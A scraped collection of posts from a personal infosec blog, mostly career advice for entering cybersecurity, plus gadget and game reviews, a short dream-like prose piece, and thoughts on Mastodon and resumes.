general qualities being asked of the respective applicants. During the course of this research, you may stumble across an abundance of job titles which resemble ‚ÄúInformation Security Analyst‚Äù or ‚ÄúCybersecurity Engineer‚Äù. This sort of job-role-normalization is common but can be misleading as responsibilities for those who wield these titles are often far more specialized and nuanced than the description would have you believe. With that said, many of us in the field do indeed have responsibilities which are more generalist in nature but typically, entry-level positions will ask that applicants have a modicum of skill in a specific domain. In any case, some infosec domains/job titles you may be interested in can be seen here! Learning. OK, so maybe you know what you‚Äôd like to do in infosec or maybe you don‚Äôt - either way, you‚Äôre likely going to need to learn some stuff. Across any specific infosec discipline, there are certain concepts or skills that will almost always be useful. I‚Äôve created a list of these fundamental information security domains and would recommend those new to the field begin learning the basics of each. For diving into this list, Google is your friend - simply search for any of those concepts and how they apply to infosec. For a more targeted approach, there is of course a multitude of online resources available. For example, I maintain a list of various infosec-related resources. Even better, check out this massive list of training, both free and paid. If you‚Äôd like to read about my journey into infosec and beyond, I‚Äôve catalogued this is great detail. Infosec is great in that you really can learn just about anything online - for free. Where you can‚Äôt find it for free, it‚Äôs probably available at a reasonable cost. The hard part is narrowing down exactly what you want to learn. But that‚Äôs what also makes the field so exciting! To make this (hopefully) easier, I‚Äôve put together a practical playbook which may help you begin your journey. Certifications. In my experience, recruiters, hiring managers, other infosec pros (to some degree) and the infosec industry at large love certifications. Take for example, the CompTIA Security+ certification. The Security+ is a great entry-level cert which can not only demonstrate that you are serious about getting into infosec but it also is a great introduction to a lot of the foundational infosec concepts you will use throughout your career. I think the return on investment in getting this cert is well worth it (I in-fact started out my infosec career with this cert so I can attest to its worthiness). The infosec field has countless certification and training offerings, you need only research what may be interesting to you. For those who are figuring out what certification or training to take next, I‚Äôve personally reviewed a variety of certifications/training courses I have taken over the years. Some popular training vendors are listed below in this guide. Check out Paul Jerimy‚Äôs awesome Security Certification Roadmap as well! The job search. Job hunting with little-to-no actual relevant work-experience can be a disheartening exercise when many of the entry-level job descriptions you come across require applicants already have several years of experience. This is an annoying paradox of the infosec field - how can entry level positions ask for several years of experience! My advice is to apply to these (entry-level) jobs anyway! You may be surprised to find that hiring managers can be willing to take risks on a less-experienced but highly motivated candidate. It may also be that the job req was written in a way that was far more limiting then the hiring company intended, thus scaring away many potential qualified candidates. I would also recommend not to be afraid of taking an entry-level infosec position that may not exactly be what you you are primarily interested in. Certifications are great, but experience will always be king and getting that first job can be tricky. It is, in my experience, easier to find additional opportunities in the field after getting that first infosec position and getting that first crucial bit of experience on your resume. Professional networking. This is as true for this field as it is for any other and I can‚Äôt stress this enough - meeting people, talking with people and expanding your professional network is a great way to discover new opportunities. So create a Twitter Mastodon account (Mastodon has a vibrant infosec community), create a LinkedIn account, check out relevant sub-reddits (or this or this), join an infosec-related discord server or two, go to local meetups, engage with online communities (other community engagement ideas here), introduce yourself to your coworkers you don‚Äôt normally interact with, go to career fairs, you never know where your next opportunity will come from. (To start, feel free to connect with me!) Auxiliary Advice: About college degrees‚Ä¶ Do you need a computer science, IT or infosec-related degree to get a job in infosec? - The short answer is no. The long answer is that a degree can certainly help you stand out in the eyes of recruiters and hiring managers. It can give you a leg up on candidates who don‚Äôt have one, it helps you bypass certain hiring filters (filters that would exclude non-degree-holding candidates) and of course the curriculum in a related degree program will likely be helpful in demonstrating experience and relevant knowledge to a prospective employer. That first job. Starting out in a help desk, software developer or other IT-related role (even if this role is not explicitly ‚Äúinformation-security-related‚Äù) is a common path for many infosec professionals. These jobs will give you valuable experience in the knowledge areas that are critical for infosec professionals. For example, as a software developer you will learn how to create awesome, functional code. Now let‚Äôs say you want to pivot into being an application security professional. That previous experience learning to write code will be instrumental in you learning how to now secure that code. This same paradigm applies to all IT roles - including everything from help desk (learning how to troubleshoot common problems with operating systems) to network engineer (learning to build, maintain and architect IT networks) to database administrator. Demonstrate and exercise your passion. This can be done in innumerable ways. Create a Github account and commit your own projects or contribute to others. Stand up a home-lab and practice networking, hacking or web development. Create a cloud account and learn about cloud architecture. Listen to infosec podcasts. Heck, create your own podcast! These are just a few ideas. What‚Äôs important is that you embrace the field so when speaking with others (for example a recruiter or hiring manager) you can demonstrate your passion and skills which will help you stand out. Join the community. The infosec community is, I think in total, a friendly, thriving, and dynamic community. There are countless meetup groups, conferences, online forums and more that can be joined. Networking and learning from others in the community helps you accelerate growth and demonstrate your passion. GOOGLE! Just about everything you could want to learn is available online. With a little motivation, determination and will-to-learn, you can learn just about anything in infosec. Spin up a ‚ÄúHomelab‚Äù. You can get a lot of experience with enterprise-grade tools right from the comfort of your own home. Nessus, Splunk, Burp Suite and Snort are just a few examples of tools used in organizations that offer free or open-source versions of their software you can download and learn to use. Your homelab can serve as a place to hone these skills before ever even applying to your first infosec position. The Homelab Alamanc from Taggart Institute is an amazing resource. Fundamental Information Security Domains: The domains below represent my take (generally) on the foundational knowledge areas for infosec professionals. You certainly do not need to be an expert in each but knowing as much as you can in each will ensure you are well-rounded. Security Fundamentals (e. g confidentiality/integrity/availability, risk management, least privilege, access control, defense-in-depth, etc‚Ä¶) Scripting/Programming (e. g. Python, Ruby, Powershell, Bash, Java, C, C#, etc‚Ä¶) OS Fundamentals (e. g. Linux, Windows, MacOS etc‚Ä¶) Networking (e. g. TCP/IP, Networking Protocols, Routing/Switching, etc‚Ä¶) Web Applications (e. g. HTTP, PHP, HTML, JavaScript, REST, SQL, etc‚Ä¶)Resources: Learning to Google for things is probably the most valuable piece of advice I can give. With that said, I‚Äôve compiled a list of (introductory) resources below which can help you get started on your infosec journey‚Ä¶ I also maintain a more comprehensive list of infosec tools if you‚Äôd like to take things a step further. Finally, there is an amazing wealth of infosec content out there on the Internet. I‚Äôm making an attempt to index that content here. Where to Learn Stuff: There are plenty of online training/learning sites. Below are some of my favorites. Check out this post for a more comprehensive list!

Getting Into Infosec Playbook: If you‚Äôve read this piece in its entirety and are still thinking, ‚Äúnow what do I do?‚Äù I‚Äôve provided a short, practical, step-by-step guide to getting started below. The goal of this playbook is to get you the highest value introductory skills and other stuff to put on a resume, and into your brain, to help you break into the cybersecurity field. Though it will vary from person to person, and depends on the depth in which you approach each of the items below, I estimate you could get through all of these in a meaningful capacity in 1 week. Yup! From zero to good-looking-resume in just a single week! Establish: Tell the world who you are, what you do and how you can help. Personally, I think a blog or site is the best way to express your self. Getting started with blogging is easy and there are plenty of ways to do it. Don‚Äôt worry about having the perfect look, niche, content, or any of that quite yet. Just getting something out there will help you build momentum. It does take a little bit of work though, so for an easier path to establishing your identity, simply create a Linkedin and/or Mastodon account (I recommend creating a separate, ‚Äúprofessional‚Äù Mastodon identity)! Having this identity helps you build a historical record of your contributions to the field while also helping others learn who you are and where else they can find you on the Internet and in the world. Connect: Alright, so you should now have some professional, social real-estate. It‚Äôs time to get out there and meet others in the industry. One easy way to get started is to simply connect with me ! Don‚Äôt be afraid to just message people, connect, follow, w/e - that‚Äôs what these sites exist for. Beyond social media, try checking out the variety of online communities which provide (near) real-time opportunities to chat, ask questions and grow your network. I even have a Discord server that you are more than welcome to join! Networking has and might always be the best way to find opportunity. Update: The world of infosec is pretty dynamic. New tools, breakthrough research, zero-days, breaches, you name it. I find that an RSS system, some Podcasts and a sprinkling of Mastodon is a great way to learn, find inspiration and never miss a thing. Check out the embedded links for getting started. Code: I see a lot of people ask, ‚Äúdo I need to know how to code to get into infosec?‚Äù The short answer is ‚Äúnot really‚Äù, but the better answer is - give it a shot!. Learning to do some basic scripting is really easy and doesn‚Äôt require you to even understand all of the complexities that may be introduced to you in a formal computer science curriculum. More importantly, having a basic understanding of how to do some coding/scripting will undoubtedly make you a more attractive candidate. So learn a little bit, create a Github account, commit literally whatever you have written, add your Github account to your resume and profit from having done really not that much work. Cloud: No way around it, understanding the ‚Äúcloud‚Äù, specifically platforms like AWS, Azure and GCP is increasingly important for modern IT/infosec professionals. What‚Äôs awesome is that getting started with these platforms is incredibly easy! You can create a free AWS or Azure account and both Amazon and Microsoft offer free training! It doesn‚Äôt take long at all before you have real, practical experience and something to throw on your resume. Tooling: The infosec industry is dominated by tools. Having documented experience with these tools helps you land a job and will likely help you succeed in that job. You can learn about what tools are in use at a given company or in a particular role by searching open job reqs (Tip #1). From there, you can (typically) find the free or open-source-alternative version of those tools, download/install them (in and lab environment) and get experience with them in the comfort of your own home! Before too long, you‚Äôll have enough know-how to not only put it on your resume, but speak to it somewhat intelligibly in an interview setting. How‚Äôs that for leveling up! CTFs: In the spirit of easy things to do that will help you get quick experience and valuable bullet points for your resume - try participating in a CTF! CTF Time is a great resource for finding CTFs, SANS Holiday Hack Challenge has years worth of awesome, interactive challenges and platforms like Hack The Box provide live hacking targets to practice and level up your skills. IPPSEC has a great resource for write-ups that can help you with your CTF-ing. I even have a few write-ups if you‚Äôre interested! Train: Training and self-study will help you fill in gaps and gain domain-specific depth/breadth. There are countless resources for training - try not to focus too much on what resources are best and just dive in. If a particular resource is not working for you, try something else out! If all else fails, getting a cert (like the Sec+) is always a good way to boost the resume. For more on what cert you should take or detailed thoughts on certs/trainings I have taken, check out this piece. Resume: Alright! We‚Äôve come pretty far now, time to put a bow on the package that is you - as you are what you present to prospective employers (not just your ‚Äúresume‚Äù). Here I‚Äôve provided my (somewhat modified) resume as a template you can use. Simply remove the stuff about me and replace it with stuff about you! Feel free to take out things you don‚Äôt have (i. e. if you didn‚Äôt create a blog or haven‚Äôt gotten a certification yet). Remember to include your professional social identities, your Github portfolio, mention your cloud knowledge, your tools experience, the CTFs you‚Äôve participated in and any relevant trainings you‚Äôve taken and what skills you may have gained from said trainings. That‚Äôs it! Go forth and conquer. Conclusion: Thanks for reading! I hope the guide was useful in some way. Have questions or just want to connect? Find me on Mastodon.

I have traversed these hollow expanses for a lifetime as my ancestors have before me. They are in my past for now all that matters is this mass below me. A world of blue, shrouds of white, I‚Äôve had this dream before. Every night for as far back as I can remember I have descended through white clouds. My conscious mind somehow exists in this world and I know it to be a dream yet I can‚Äôt shake the feeling of reality that seems to be present here. More clouds, less sky. Elements exist in such rare form and combination here. Where generations before me have failed I have finally claimed victory. I gaze intently through the haze while visages of the unimaginable appear for an instant and then vanish. Will I reach the bottom? More clouds, less sky. Perhaps my heart has been right all along and this is the only true actuality. Perhaps the endless space and solitary balls of mindless fire exist only within my nightmares. How long have I been here, drifting in and out of what is real and what might never be. More clouds, less sky. Will I reach the bottom before I wake? Will I be seized by that endless black nightmare before I reach the bottom? Everything seems shrouded in doubt yet hope still remains. I plummet further and further and these clouds ensnare me. Suddenly a break in the mist, is a chance at my destiny imminent? My eyes become strained and I long for the sight of something, something that no one has seen. This is the farthest I‚Äôve gone and I feel so close now. One more foot and it will all become clear to me but wait, have I stopped? Less clouds, more sky. I realize that my descent has been stopped short and I am now returning to that endless field of hopeless white lights. I try to scream but no words come out. A sickness washes over me and I want to wake up. Less clouds, more sky. I twist and turn, pinch myself in failed attempts to return to consciousness. Perhaps I‚Äôm already awake? I must sleep. I freeze and become limp. Less clouds, more sky. White, and then blue, and then black, I close my eyes and I am yet again in darkness surrounded by these phosphenes that dance mercilessly in the void.

The big difference between this new approach and the traditional approach is I have not included the list-of-each-job-in-chronological-order-with-what-I-did-at-each-place stuff that you typically see. Instead, I have summarized the projects and skills that best summarize my experience and included an alphabetical list of places I have worked. Let me explain why I don‚Äôt like the traditional approach‚Ä¶ I find that the focus being on where you‚Äôve worked as opposed to what your achievements are is really just a means by which prospective hiring teams can discriminate against you or otherwise discount valuable experience you have because they don‚Äôt like or know the company that that experience was associated with. That‚Äôs not to say that 5 years of experience at Google is the same as 5 years experience at some small company, but in the end, I‚Äôve never been in an actual interview where it‚Äôs seemed like I‚Äôve gotten points based on where I‚Äôve worked in the past. Ultimately, I still needed to prove my knowledge in the interview and that can be done by anyone with the skills/confidence required, not just by those with the ‚Äúbest‚Äù companies listed. Total years experience. This is and has always been a dreadful way of judging someone‚Äôs relative skill. There are plenty of 10+ year pros who can‚Äôt do half of what some talented up-starts with 3 years experience can do. In a traditional resume, you have to list time and duration for every. single. job. This artificial handicap serves only to limit otherwise equally/more-talented younger professionals. Speaking of ‚Äútotal years experience‚Äù, what about having to include jobs you held 7+ or even 10+ years ago? This is often expected / required on traditional resumes but does little to help bolster the way you market yourself. Companies should care about what relevant skills you have, not what you were up to that long ago. This serves only as a way for companies to potentially profile or judge you based on what you did in the past. For example, let‚Äôs say you served on a help desk 10 years ago, maybe a company will think negatively of that experience. Why share your entry-level experience when they are looking for what you have done at a more senior level? Project/job held duration. This is one of my least favorite things that is expected on traditional resumes. The point here I guess is that companies want to know if you‚Äôre some sort of serial job hopper. But there are LOTS of reasons to leave a job, many of which do not or should not reflect poorly on a prospective candidate. But, despite this, I think most prospective hiring panels see short stints on a resume and think the worst, even in areas (DC metro anyone?) where short-term consulting gigs are not only common, but potentially the norm! Instead of having to conform to this exact resume format, why not market yourself how YOU want to market yourself? Traditional resume formats are designed to put you at a disadvantage, revealing everything about yourself while the company has to reveal nothing about itself. Does the company you‚Äôre applying for have to reveal everyone it has fired and why? Does it have to reveal past or future lay-off plans? Though some companies are more transparent than others, all of them - and I mean 100% of them reveal less about themselves to a prospective employee as you must divulge to them. A background check is a good example of this, when‚Äôs the last time you ran a background check on a company? We, as a society of professionals need to change our mindset on resumes, and begin to collectively accept non-standard resume formats. " }, { "id": 115, "url": "https://shellsharks.com/notes/2021/11/01/dyson-lightcycle-morph-floor-light-review", "title": "Dyson Lightcycle Morph floor light review", "body": "2021/11/01 - I recently took delivery of and set up the Dyson Lightcycle Morph Floor Light in the Black/Brass finish. This light had been on my radar for a while now as I thought it was a really unique and cool looking gadget. Of course at 849. 99, the price was certainly a bit steep for what, at the end of the day, is just a lamp. Below I cover the good and the bad of this lamp from my perspective‚Ä¶ The Good: The physical setup of the light is dead simple. You need only get it out of the box, attach the pole to the base and then plug it in! Connecting the light to the app is a little more involved (it requires Bluetooth), but still relatively easy. I really love the design of the lamp. The light can get really bright, up to 850 lumens and can range from a very energizing, cool light (6500K) to a really relaxing warm light (2700K). The lamp is very adjustable (hence the name: ‚ÄúMorph‚Äù) as you can angle it in any direction from straight up/down to a full 360 rotation. Couple this with the lighting modes described above and you can see this light is immensely versatile. I can illuminate the surface of my desk if I am reading, shine it directly at an adjacent wall to generally brighten up my space, dim the lights to provide a more relaxed mood, etc‚Ä¶ The scenes that can be set are pretty endless! A really cool feature of the light is you can rotate the light such that it points directly down into the stem of the lamp. Here the light will illuminate the perforated stem and create a very cool ambient light mode where you just have a glowing pillar. Very cool for chilling out! The Dyson Link app offers a sync mode where the lamp will adjust it‚Äôs warmth and intensity based on the ambient light in the room and the time of day. This allows the light to adjust automatically based on the current settings of the room. Modern HomeKit lights have a very similar feature (Adaptive Lighting) so in this way they can all stay relatively in sync! Since this lamp is a floor lamp rather than a desk lamp, it keeps my desk from accumulating additional clutter. I like having a clean desk where possible so this is great! Returning a Dyson product is a very simple process. The team responsible for returns are very prompt, provide free returns and will notify you of the status all along the way. (I ordered a Task Light and did not end up keeping it. ) The Bad: The price. ~$850 for a lamp is rough. Buggy connection over Bluetooth. When attempting to interact with the light using the mobile app, I often have to force-quit the app and restart it for the Bluetooth connection to work such that I can control the light remotely. Also, since the connection is over Bluetooth, I am unable to control the light when out of Bluetooth range. No HomeKit integration. The rest of the lighting in my desk setup is controllable over HomeKit. This isn‚Äôt a huge deal but it does add an extra step when trying to get my lighting scene set at any given time. There are some touch controls on the lamp arm. These are a little difficult to control as the arm itself is very sensitive and will rotate with very little force applied. This means you need to hold the arm in place while you adjust the settings, otherwise the arm will rotate. The metal portion of the lamp arm closest to the light bulb will actually get pretty hot, so if you attempt to hold the lamp arm in place you run the risk of potential light burns (or at least experience some discomfort). The touch-based controls nearest the light (on the black plastic portion of the arm) are very sensitive, so if you accidentally brush these, you may change the setting on the light. This makes adjusting the light settings a very delicate operation as there is only a small part of the lamp arm that you can touch without accidentally changing something or (very slightly) burning yourself. The lamp sports a movement sensor, the purpose of which is to turn on when movement is detected and turn off after a certain period of time when movement is not detected. In theory this is a cool feature but in reality, when sitting at your desk for long periods of time, the light will turn off even though you are still sitting there. This feature is easily disabled. When I first set the lamp up, I believed there was an issue with the device so I initiated a call to Dyson‚Äôs customer support. Their (presumably Tier 1) customer support associate was truly dreadful to speak to. They were overly invasive in the information they needed from me in order to help troubleshoot my issue, they were not knowledgeable at all about the product in question, and they took forever to respond. Further, I opened the support session directly via the app which is incredibly fragile in actually keeping the session alive. If you navigate away from the page or close the app, the session is ended and you lose all your progress (you‚Äôre lucky if you actually make any progress with that support team though). Ultimately, the good outweighed the bad for me and I intend on keeping the light!

Over time these lines definitely have blurred but I still tend to have two separately maintained identities, e. g. LinkedIn vs Facebook (which I haven‚Äôt really used in years), two Twitter accounts, two Mastodon accounts, etc‚Ä¶ For my ‚Äúpersonal‚Äù social media usage, honestly I could go anywhere - Mastodon, Threads, BlueSky, w/e. For #infosec, I want to be where other infosec people are, and I need the ability to have a curated (just who I follow) feed, which is what Mastodon gives me. I came over to infosec. exchange/Mastodon in earnest in late 2022 during one of the larger Twitter exoduses as did many other infosec folks. I really hope people keep at least their infosec selves here and continue to engage/contribute but with all these new entrants (BlueSky, Threads, Spill, w/e) and other drama with fedipact fracturing, I‚Äôm a little worried the infosec-specific timeline and engagement could dry up. FWIW, I am committed to #Mastodon and the larger #Fediverse as my professional/tech-chat home for the long term and hope to see (at least) this specific community continue to grow! A little more on this‚Ä¶ I‚Äôve always felt the need to maintain two identities not because I was worried about those in my professional sphere being exposed to my personal sphere/chatter (or vice versa) but because I always appreciated those that I followed that kept their personal chatter to a minimum. Now I understand maintaining two identities like this is tough and certainly don‚Äôt fault anyone for posting non-work things on their social accounts (i. e. maintaining a single all-encompassing identity), but I wanted to at least try to be that for others. Even if #Mastodon fades into relative obscurity and ceases to be a place where I can get breaking infosec news and conversations about infosec going, I feel good in my backup strategy of leveraging my comprehensive infosec #RSS library for read-only news and the #threadiverse /similar platforms for conversation. @keefer Honestly, even for me I can tolerate a good ratio of personal : professional stuff coming from most people‚Äôs feeds. But there are those who post like 10x+/day every day and &lt;1% is anything infosec/tech-adjacent. These accounts are typically ‚Äúinfluencer‚Äù types who have managed to cobble together a large following which seems to go their head a bit =P. I‚Äôm probably on the more extreme end of follow-pruning and I don‚Äôt mind the personal stuff - easy enough to scroll by. Despite Twitter‚Äôs many faults over the years, I did get some professional/infosec use out of it thanks to some high-fidelity feeds from cyber personalities and researchers. I aimed to be that while I was there, but never really found a niche posting anything out onto Twitter, so mostly I just lurked. I‚Äôve found on Mastodon that I have felt far more comfortable posting, engaging and things just seem very authentic.

As such, I adore both projects and will likely keep both on my phone. For many, the fact that Feditext is (currently) free may be the deciding factor, but at only ~$2/month, Ivory isn‚Äôt exactly super out-of-reach. Ivory doesn‚Äôt have any plans to support any non-Mastodon instance so that may also be a deciding factor for a growing population of Fediverse folks. For me, Ivory holds a slight edge and will continue to be my primary Mastodon client thanks to the unique set of features it boasts. That said, Feditext is only in TestFlight beta and Ivory is under active development, so still a lot left to be seen in this race!

That piece is filled with solid reasons I still stand by today. But since that time, I‚Äôve come to understand a more meaningful reason to have a website and as part of that site, some form of syndicated content (i. e. a blog). For most, ‚Äúidentity‚Äù on the web is tied to one, or fractured across a few, social media platform(s). Recent history has revealed the pitfalls of this approach. Enshittification, terrible management, or even platform collapse can result in catastrophic loss of your connections, communities, business income and more. So many refuse to leave Twitter (er‚Ä¶ ‚ÄúX‚Äù) because their too invested, to leave would be to sacrifice one or more of these things. Why do we continue to feed these platforms that always fail, that always betray us, that violate our privacy, that never represent who we truly are? Having a website, a place that is yours, that you can design to your specification, share anything you want, how you want and make easily available to all is such an obvious solution and it really isn‚Äôt that much harder than creating a (pick your social media platform of choice) account. There are a TON of services these days that make it dead simple to get up and running with a customizable site and start publishing. The beauty of this (blogging), is that you can syndicate however you‚Äôd like from there.

See what has happend with outdoors. lgbt (i. e. catastrophic backup failure), newsie. social (i. e. server upkeep costs), or what is currently happening with fosstodon and you will see that even good intentioned server admins are still prone to failure. These failures can result in total loss of your online identity/account. So put your faith in yourself. Buy a domain, host your stuff there, syndicate it out where you please, live on. I‚Äôll add to this. Even here @ infosec. exchange this rings true. You can‚Äôt ask for a better server admin than @jerry . Even-handed, extremely technically-proficient, community-oriented, you name it. But a day will inevitably come when Jerry has to hang it up one way or another, whether that be to pass admin-ship onto new worthy ownership or w/e.

Respond to people to create organic conversation, be genuine, use hashtags, put effort in for a few months not days or weeks, creating a network here requires some investment but pays off imo. Some people want more native functionality to boost engagement in their social platform and as it stands now, Mastodon doesn‚Äôt provide this, so getting started requires a bit of effort to get momentum. It‚Äôs not for everyone. I‚Äôve posted (what I felt to be) really interesting things or questions to no response. Other times, I get lots of feedback. Sometimes just random based on the day.

I could also see myself spending time doing mentorship, community building or academia/education-related things. #cybersecurity #infosec #career " }, { "id": 156, "url": "https://shellsharks.com/notes/2023/10/20/infosec-mastodon-starter-pack", "title": "Mastodon starter pack", "body": "2023/10/20 - Here‚Äôs a quick #welcome / ‚ÄúMastodon starter pack‚Äù I wanted to share for all those new to and still trying to get situated with Mastodon. Top tips: These are my personal top tips for getting started with / using Mastodon. When you come across an interesting post, Bookmark or otherwise save it! Finding old posts can be devilishly tricky. Add a profile picture, short profile description and make an #intro / #introduction post and pin that post to your profile. While you‚Äôre at it, if you have a personal/professional web site, link to your site in your profile and use Mastodon verification on the site! If you are on a small or mid-sized, somewhat focused instance, make sure to leverage your Local feed to find interesting content and accounts. Boost interesting posts, especially those from accounts with smaller followings. We are the algorithm and discovery is made a lot easier when people share. Plus it makes the original poster feel good and gives their account exposure which is nice. Use a third-party Mastodon client. The first-party client is imo woefully underpowered. There are lot‚Äôs of great clients to choose from! (e. g. Ivory, Ice Cubes, Mammoth, trunks, Sora, Mona etc‚Ä¶) Follow accounts when you see something interesting from them. It‚Äôs easier to unfollow accounts later that you no longer like than it is to find interesting accounts after the fact. Hashtags are also a great source of discovery. Want engagement? Want followers? Try engaging with posts and following people rather than posting into the void. Bootstrap your feed by leveraging an importable follow list. (i. e. TechInfoSecMastodon, Academics on Mastodon, Members of Congress on Mastodon, Verified Media on Mastodon) For general help, consider following @FediFollows and @feditips. To ask questions, try tagging posts with #askfedi #fedihelp &amp; #mastohelp. Optional: Enable search for your account! This is an opt-in feature but is great for people to help find you and your posts.

I did want to comment though that I think iPads are really much more powerful than a lot of people give them credit for. I‚Äôve posted recently about how good they are with stage manager and external monitor support in replicating a ‚Äúreal computer‚Äù with respect to multi-tasking and windowed apps (given you have an M1-enabled iPad Pro). Though not EVERY workload is natively accessible on modern iPad hardware, most things are. There are IDE‚Äôs, photo/video editing software, Remote Desktop, tools for Git, Interpreters (e. g. JS, Python, etc‚Ä¶), Swift playgrounds, and more! If you really really need more than that you could even just get yourself an AWS account and SSH into a traditional OS and play around with it directly from the iPad. You get all this in a package that has great battery life, never has a loud fan, can sport a cellular connection, has all the power of the vast library of iOS/iPad apps, and is extremely portable. All this said, what are you envisioning for your kids in terms of what they could learn on a ‚Äúfull machine‚Äù? Powershell/Bash? Compiled languages? Virtualizing Linux and doin‚Äô stuff? I keep some ‚Äúreal computers‚Äù around for various things I do in the infosec space but have started to move 99% of my daily compute to an iPad for all the reasons I mentioned. Cheers!

Not sure how large this group is but they exist. Now consider the relative difficulty of a new, or low-follower account reaching a large audience or even being seen at all in the Fediverse. Without an algorithm, posts are easily lost in the local timeline deluge, never to be seen or engaged with. What if, for those who want to amass followers (for whatever reason) and would in turn follow anyone who followed them, put a keyword, something like ‚Äú#autofollow‚Äù or something in their profile which could be crawled and then the entire network of people with this tag could instantly* follow all those accounts and be followed by all those accounts. Now they have some level of reach, as their posts would hit home timelines instead of local timelines and they have some level of discoverability as active posters and boosters are now populating their own home timeline. At any point, once you felt you had a decent footing you could remove the tag from the profile and thus exit said ‚Äúnetwork‚Äù. From there, you could prune your follows as you saw fit. * This idea isn‚Äôt fully fleshed out and I‚Äôm sure there are plenty of abuse vectors, and no tooling for automating the ‚Äúnetwork‚Äù, but I think there would be a fair amount of people who would benefit from bootstrapping a follow/follower footprint on Mastodon since feed curation and gaining followers can be time consuming. #random #follow #mastodon #fediverse " }, { "id": 160, "url": "https://shellsharks.com/notes/2023/11/01/nablopomo-2023", "title": "NaBloPoMo", "body": "2023/11/01 - November is here, and for bloggers that means National Blog Posting Month (or #NaBloPoMo) is upon us!

They also debuted a new ‚ÄúSpace Black‚Äù colorway for the MacBook Pro (which looks pretty nice). For more info on what was released, specs, etc‚Ä¶ I suggest checking out one of the many tech blogs that will have covered it in much better depth (i. e. The Verge, MacRumors, Macworld, MacStories, etc‚Ä¶). Here are some other thoughts and takeaways‚Ä¶ The memory amounts you can configure on this device are somewhat strange, 18, 24, 36, 48??? But the option to configure up to 128 is amazing (albeit wildly expensive). The MacBook Pro, with ‚ÄúPro‚Äù in the name, is getting to the point, both spec-wise and price-wise where it truly is just for Pros. Where ‚ÄúPros‚Äù means those who have professional workflows for software dev, photo/video editing, graphic design, etc‚Ä¶ Sure, there are nerds like me who will find a way to justify needing top-end, highly spec‚Äôed models but this is because we always NEEDED to do this in the past, during the Intel era. These days, a much more ‚Äúmodestly-spec‚Äôed‚Äù model is still likely overpowered for most peoples needs (including my own). For us non-Pros who still want pro hardware, know that the base model M3 MacBook Pro can only natively support one external display. This is an unfortunate deficiency for an otherwise powerhouse, and relatively low-priced computer. A fully-stacked 16-in MacBook Pro can be priced up to over $7200 dollars. WoW!! If I got one though, I‚Äôd spec it this way‚Ä¶ 14in Apple M3 Max chip with 14‚Äëcore CPU, 30‚Äëcore GPU, 16‚Äëcore Neural Engine 96GB unified memory 2TB SSD storage Comes to $4,399 Only a few days after the event, the MacBook Pro is now third down on Apple‚Äôs main page after being in the top slot immediately following the event. iPhone is still the king! At the end of the keynote, Apple shared the fact that the event was entirely shot using the iPhone 15 Pro Max as the camera. The behind the scenes article they shared however caused a bit of controversy in the Apple/Tech news world. Shot on iPhone ControversyOK, a number of tech journalists (and just folks on the Internet) seemed to take some exception to the fact that Apple included a note at the end of the keynote which proudly revealed they had shot the entire thing using the iPhone 15 Pro Max. The Verge for example felt the need to call Apple out on this. What they (The Verge) are saying isn‚Äôt wrong per say, Apple DID require the use of a lot of expensive equipment to pull off that level of quality, but it definitely misses the point. They (again, The Verge) and many others seem to think that Apple‚Äôs inclusion of this note was in some way meant to infer that anyone off the street could whip out their iPhone and produce something that looked as good as that keynote recording did just because they too have the same iPhone. On the face of it, I could see why you might think that, those scheme-ey Apple marketing folks right? But once you read the behind the scenes article Apple shared you see the much more realistic (and somewhat obvious) narrative‚Ä¶ The behind the scenes look was meant to be a showcase of what the iPhone can do for real professionals, ‚Äúsemi‚Äù-professionals and aspiring videographers alike. Afterall, the Scary Fast event itself centered mostly around MacBook ‚ÄúPros‚Äù, meant for pros doin‚Äô pro stuff. Apple spends the majority of the article, covering all the fancy pro-level features the iPhone Pro sports that help facilitate pro video workflows. Features such as, Academy Color Encoding System (ACES), ProRes, capturing to an external drive, Apple Log, bleeding edge Bluetooth spec, USB-C (i. e. transfer speeds), improvements in lowlight performance and integrations with platforms like Blackmagic / Tentacle Sync were all highlighted. So yeah, normal folks don‚Äôt have the gear, they don‚Äôt have the training, nor the experience but they do have the camera. For everyone out there who‚Äôs trying to up their game in the video-taking world they can now know that their camera (assuming they have the iPhone 15 Pro) is not what is holding them back, they should spend their time/money upping other parts of their rig instead. " }, { "id": 162, "url": "https://shellsharks.com/notes/2023/11/03/super-mario-wonder", "title": "Super Mario Wonder", "body": "2023/11/03 - I recently finished* my playthrough of Nintendo‚Äôs latest Mario side-scroller, Super Mario Wonder. My short review? It was delightful but not without some deficiencies. I‚Äôve listed out what I liked and what I didn‚Äôt like below! * I haven‚Äôt yet conquered the final marathon level. What I Like: The swappable badge system which grants your character a number of interesting abilities for the entirety of the level was great. Though I did tend to just default to the ‚ÄúBoosting Spin Jump‚Äù action badge as it gave me the most utility for avoiding death, getting top position on the flag pole, etc‚Ä¶ No surprise, but the art design, music and sound effects were all fantastic. Nintendo always shows up here. Playing as a variety of characters is a great addition, though I tend to just play as Mario if all else is equal. The ability to easily look at the progress for each (found) world and warp to it was a great quality-of-life feature. Wonder Flowers were a real joy. You honestly had no idea what would happen after triggering one and the overwhelming majority of wonder experiences were really great, a mix of challenging or simply rewardingly fun. My only complaint is that some of those individual experiences were so limited. Would have loved to reprise my role as the wondrous super hoppy cat. Wonder introduced a whole slew of new kooky enemies. Loved ‚Äòem. In general, I thought the levels were well-designed, of good length and very fun. What I Didn‚Äôt Like: I know why they did it this way, but I would have liked it more had they made each character have a different, classic in-level ability. (i. e. Super Mario 2) The new power-ups (drill cap, elephant fruit, bubble flower) were only so-so for me. The drill might have been the best of the 3 but made certain things too easy and was too specific in other cases. Any level that required me to jump to a beat. Just no. Seems somewhat exclusionary for deaf players or those who play with low/no sound. Would have enjoyed more challenging levels. There was not enough scarcity for the Purple Flower Coins with respect to the currency system. Not that Mario should be about farming coins to buy stuff, but I always had enough coins to buy whatever I wanted, so it felt unncessary. The game seemed short. Maybe it was just the fact that I binge played it, but between the relative easiness and the amount of real levels-of-substance, I felt it was just short. Some by-the-level comparisons below‚Ä¶ Super Mario 1 - 32 levels Super Mario 2 - 20 levels - Super Mario 3 - 90 levels! Super Mario World - ~74 levels (though 96 unique exits) Super Mario Yoshi‚Äôs Island - 54 levels Super Mario 3D World - 117 levels üëë Super Mario Wonder - 152 levels, but only 79 of them are ‚Äúregular‚Äù levels, so not counting badge challenges, races, KO arenas, search parties or break times. There weren‚Äôt really a lot of boss battles, and the ones we did have were very one-note. No Reznor‚Äôs, no Big Boo, Bowser was just a floating hand thing (lame), no Magikoopa, no Boom Boom sigh‚Ä¶ Not that many secrets (and secret exits), at least that I‚Äôve found. What exactly was 